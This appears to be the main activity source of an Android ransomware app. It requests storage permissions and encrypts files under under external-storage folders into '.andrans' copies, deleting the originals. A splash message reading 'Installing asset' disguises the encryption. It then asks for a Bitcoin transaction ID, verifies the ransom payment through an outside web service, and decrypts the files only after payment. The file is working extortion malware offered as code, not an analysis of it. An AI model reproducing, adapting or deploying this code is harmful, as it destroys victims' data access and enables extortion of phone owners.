package github.greyjustice.randyandy;

import android.app.*;
import android.content.*;
import android.content.pm.*;
import android.content.res.*;
import android.net.*;
import android.os.*;
import android.support.annotation.*;
import android.support.v4.app.*;
import android.view.*;
import android.widget.*;
import java.io.*;
import java.net.*;
import java.util.*;
import javax.crypto.*;
import javax.net.ssl.*;

public class MainActivity extends Activity {
	HttpsURLConnection conn;
	Activity me;
	String USER_AGENT = "Mozilla/5.0";
	EditText TxID;
	Button verifyButton;
	final static int REQUEST = 192;
	int maximumFileKBSize = 10000;
	CookieManager cm;
	List<String> cookies;
	TextView log;
	SharedPreferences prefs;
	SharedPreferences.Editor editPrefs;
	SecretKey key;
	TextView splashLog;
	String[] targetDirectories;
	String[] targetExtensions;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.splash);
		splashLog = findViewById(R.id.splashLog);
		prefs = getApplicationContext().getSharedPreferences("CustPrefs", MODE_PRIVATE);
		editPrefs = prefs.edit();
		Resources res = getResources();
		targetDirectories = res.getStringArray(R.array.directories);
		targetExtensions = res.getStringArray(R.array.extensions);

		if (!prefs.contains("strKey")) {
			String key = EncryptionUtility.key2string(EncryptionUtility.generateKeyPair("yougothacked"));
			editPrefs.putString("strKey", key);
			editPrefs.commit();
		}
		key = EncryptionUtility.string2key(prefs.getString("strKey", null));

		me = this;
		String[] perms = {android.Manifest.permission.WRITE_EXTERNAL_STORAGE,android.Manifest.permission.READ_EXTERNAL_STORAGE,android.Manifest.permission.INTERNET};

		if (checkSelfPerms(this, perms)) {
			new Thread(new Runnable(){
					@Override
					public void run() {

						if (!prefs.getBoolean("payOk", false)) {
							try {
								startEncrypt(targetDirectories, targetExtensions);
							}
							catch (Error e) {
								notifyText(e.getMessage());
							}
						}

						me.runOnUiThread(new Runnable(){
								@Override
								public void run() {
									setContentView(R.layout.main);
									log = findViewById(R.id.log);
									TxID = findViewById(R.id.txid);
									verifyButton = findViewById(R.id.verifyBotton);
								}
							});
					}
				}).start();
		}

    }

	private void startEncrypt(String[] directories, String[] types) {
		for (String directory: directories) {
			File tmp = new File(Environment.getExternalStorageDirectory().toString() + "/" + directory);
			if (tmp.isDirectory() && tmp.exists()) {
				for (String type: types) {
					encryptFiles(type, directory);
				}
			}
		}
	}

	private void startDecrypt(String[] directories, String[] types) {
		for (String directory: directories) {
			File tmp = new File(Environment.getExternalStorageDirectory().toString() + "/" + directory);
			if (tmp.isDirectory() && tmp.exists()) {
				for (String type: types) {
					decryptFiles(type, directory);
				}
			}
		}


	}


	public byte[] encryptBytes(byte[] data) throws Exception {
		return EncryptionUtility.encryptData(key, data);
	}


	public byte[] decryptBytes(byte[] data) throws Exception {
		return EncryptionUtility.decryptData(key, data);
	}

	int all = 1;
	private void encryptFiles(String fileType, String folder) {
		String path = Environment.getExternalStorageDirectory().toString() + "/" + folder;
		File directory = new File(path);
		List<String> result = new ArrayList<>();
		search(".*\\." + fileType, directory, result);
		int now = 0;
		for (String s : result) {
			now++;
			all++;
			File tmp = new File(s);
			int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
			if (maximumFileKBSize >= file_kb) {

				logSplashText("Installing asset : " + now + "/" + result.size());
				try {
					writeFile(tmp.getAbsolutePath() + ".andrans", encryptBytes(readFile(tmp.getAbsolutePath())));
					tmp.delete();
				}
				catch (Exception e) {
					notifyText(e.getMessage());
				}
			}
			else {
				tmp.renameTo(new File(tmp.getParent(), tmp.getName() + ".andrans"));
			}
		}
	}

	int allDec = 1;
	private void decryptFiles(String fileType, String folder) {
		String path = Environment.getExternalStorageDirectory().toString() + "/" + folder;
		File directory = new File(path);
		List<String> result = new ArrayList<>();
		search(".*\\." + fileType + ".andrans", directory, result);
		for (String s : result) {
			File tmp = new File(s);
			tmp.setReadable(true);
			tmp.setWritable(true);
			allDec++;
			logText("Decrypted file " + allDec + "/" + all + " : " + tmp.getName());

			int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
			if (maximumFileKBSize >= file_kb) {
				try {
					writeFile(tmp.getAbsolutePath().replaceAll(".andrans", ""), decryptBytes(readFile(tmp.getAbsolutePath())));
					tmp.delete();
				}
				catch (Exception e) {
					tmp.renameTo(new File(tmp.getParent(), tmp.getName().replace(".andrans", "")));
				}
			}
			else {
			  	tmp.renameTo(new File(tmp.getParent(), tmp.getName().replace(".andrans", "")));
			}
		}
	}


    public static void search(final String pattern, final File folder, List<String> result) {
        for (final File f : folder.listFiles()) {

            if (f.isDirectory()) {
                search(pattern, f, result);
            }

            if (f.isFile()) {
                if (f.getName().matches(pattern)) {
                    result.add(f.getAbsolutePath());
                }
            }

        }
    }
	public Boolean checkSelfPerms(Context ctx, String [] PERMISSIONS) {
        if (Build.VERSION.SDK_INT >= 23) {
            if (!hasPermissions(ctx, PERMISSIONS)) {
                ActivityCompat.requestPermissions((Activity) ctx, PERMISSIONS, REQUEST);
            }
			else {
				return true;
            }
        }
		else {
            return true;
        }
		return false;
    }

	public byte[] readFile(String path) {
		File file = new File(path);

		byte [] fileData = new byte[(int) file.length()];

		try {
			try(FileInputStream fileInputStream = new FileInputStream(file)) {
				fileInputStream.read(fileData);
			}
		}
		catch (IOException e) {}
		return fileData;
	}

	public static void writeFile(String path, byte [] data) throws IOException {
        try(FileOutputStream fileOutputStream = new FileOutputStream(path)) {
            fileOutputStream.write(data);
        }
    }



	public void notifyText(final String msg) {
		me.runOnUiThread(new Runnable(){

				@Override
				public void run() {
					Toast.makeText(me.getApplicationContext(), msg, Toast.LENGTH_LONG).show();
				}
			});
	}



    private static boolean hasPermissions(Context context, String... permissions) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case REQUEST: {
                    if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
						// restart on ok
						onCreate(null);
                    }
					else {
                        // todo for denied
						logSplashText("PERMISSION DENIED\nCan not install files, Exiting...");
						new Thread(new Runnable(){

								@Override
								public void run() {
									SystemClock.sleep(5000);
									finishAndRemoveTask();
								}
							}).start();
                    }
                }
        }
    }


	private Boolean payOk = false;
	public void verify(View view) {
		final String txid = TxID.getText().toString();
		payOk = prefs.getBoolean("payOk", false);
		if (payOk != true) {
			editButton(verifyButton, "VERIFYING PAYMENT", false);

			new Thread(new Runnable(){
					@Override
					public void run() {
						try {
							int result = checkPayment(txid, getString(R.string.wallet_address));
							if (result == 201) {
								payOk = true;
								logText("Verification of payment TxID : " + txid + " confirmed " + getString(R.string.ransom_amount) + " sent to " + getString(R.string.wallet_address));
								editButton(verifyButton, "DECRYPTING FILES", false);
								editPrefs.putBoolean("payOk", true);
								editPrefs.commit();
								logText("DECRYPTING FILES");
								startDecrypt(targetDirectories, targetExtensions);
								logText("FILES RESTORED\n");
								editButton(verifyButton, "DECRYPTED FILES", true);
								Intent intent=new Intent(Intent.ACTION_DELETE);
								intent.setData(Uri.parse("package:" + getPackageName()));
								startActivity(intent);
							}
							else if (result == 200) {
								editButton(verifyButton, "TRY AGAIN", true);
								logText("Verification failed due to transaction still pending.");
							}
							else {
								editButton(verifyButton, "VERIFY PAYMENT", true);
								logText("Verification failed due to incorrect payment amount or incorrect Tx ID.");
							}
						}
						catch (Exception e) {
							logText("Verification failed due to internet access failure.");
							editButton(verifyButton, "VERIFY PAYMENT", true);
						}

					}
				}).start();

		}
		else {
			editButton(verifyButton, "DECRYPTING FILES", false);
			logText("DECRYPTING FILES");
			startDecrypt(targetDirectories, targetExtensions);
			logText("FILES DECRYPTED");
			editButton(verifyButton, "FILES RESTORED", false);
			Intent intent=new Intent(Intent.ACTION_DELETE);
			intent.setData(Uri.parse("package:" + getPackageName()));
			startActivity(intent);
		}
	}


	public void logSplashText(final String msg) {
		me.runOnUiThread(new Runnable(){

				@Override
				public void run() {
					splashLog.setText(msg);
				}
			});
	}

	int logs = 0;
	public void logText(final String msg) {
		me.runOnUiThread(new Runnable(){

				@Override
				public void run() {
					logs++;
					if (logs < 5) {
						log.setText(msg + "\n" + log.getText().toString());
					}
					else {
						log.setText(msg);
						logs = 0;
					}

				}
			});
	}


	public void editButton(final Button button, final String text, final Boolean enabled) {
		me.runOnUiThread(new Runnable(){

				@Override
				public void run() {
					button.setText(text);
					button.setEnabled(enabled);
				}
			});
	}

	private int checkPayment(String TxiD, String address) throws Exception,Error {
		String url = "https://btctrans.herokuapp.com/?txid=" + TxiD + "&verifyAmount=true&amount=" + getString(R.string.ransom_amount) + "&verifyReceiver=true&receiver=" + getString(R.string.wallet_address);
		GetPageContent(url);
		return currentResponseCode;
	}

	// Get Page
	int currentResponseCode = 200;
	String currentUrl;
	private String GetPageContent(String url) throws Exception {
		URL obj = new URL(url);
		conn = (HttpsURLConnection) obj.openConnection();

		// default is GET
		conn.setRequestMethod("GET");
		conn.setUseCaches(false);
		conn.setConnectTimeout(15000);
		conn.setReadTimeout(15000);

		// act like a browser
		conn.setRequestProperty("User-Agent", USER_AGENT);
		conn.setRequestProperty("Accept",
								"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
		if (cookies != null) {
			for (String cookie : this.cookies) {
				conn.addRequestProperty("Cookie", cookie.split(";", 1)[0]);
			}
		}

		int responseCode = conn.getResponseCode();
		currentResponseCode = responseCode;
		String responseMessage = conn.getResponseMessage();
		BufferedReader in = 
            new BufferedReader(new InputStreamReader(conn.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}

		in.close();
		currentUrl = conn.getURL().toString();
		// Get the response cookies
		setCookies(conn.getHeaderFields().get("Set-Cookie"));

		return response.toString();

	}


	public List<String> getCookies() {
		return cookies;
	}

	public void setCookies(List<String> cookies) {
		this.cookies = cookies;
	}
}
